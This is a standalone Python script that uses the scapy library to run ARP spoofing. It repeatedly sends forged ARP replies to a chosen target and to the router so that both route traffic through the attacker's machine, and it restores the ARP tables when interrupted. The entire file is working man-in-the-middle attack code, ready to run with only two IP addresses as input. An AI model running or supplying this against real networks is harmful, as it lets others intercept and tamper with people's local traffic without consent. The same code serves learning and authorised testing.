#!/usr/bin/env python3

import scapy.all as scapy
import time
import argparse
import subprocess
import os


def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="IP Address of Target Device")
    parser.add_argument("-r", "--router", dest="router_ip", help="IP Address of Router")
    options = parser.parse_args()
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, router_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, router_ip):
    destination_mac = get_mac(destination_ip)
    router_mac = get_mac(router_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=router_ip, hwsrc=router_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_argument()
sent_packets = 0
os.system("clear")
try:
    while True:
        spoof(options.target_ip, options.router_ip)
        spoof(options.router_ip, options.target_ip)
        sent_packets += 2
        print("\r[+] Packets Sent " + str(sent_packets), end="")
        time.sleep(2)
except KeyboardInterrupt:
    subprocess.call(["clear"])
    print("[+] Packets Sent " + str(sent_packets))
    print("[+] Detected CTRL + C ... Resetting ARP tables... Please wait.\n")
    restore(options.target_ip, options.router_ip)
